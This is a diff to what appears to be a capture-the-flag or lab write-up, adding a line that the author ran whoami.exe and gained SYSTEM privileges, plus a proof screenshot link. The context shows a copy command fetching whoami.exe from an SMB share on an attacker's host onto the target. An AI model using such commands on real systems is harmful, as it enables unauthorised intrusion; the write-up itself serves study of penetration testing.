@@ -99,3 +99,6 @@ And downloaded the file in the target machine:
 ```bash
 copy '\\\10.10.14.39\a\whoami.exe'
 ```
+Ran the binary, as saw that I have NT AUTHORITY/SYSTEM privileges.\
+Proof Screenshot here:
+![priv_esc_poc](images/legacy_privesc_poc.png)
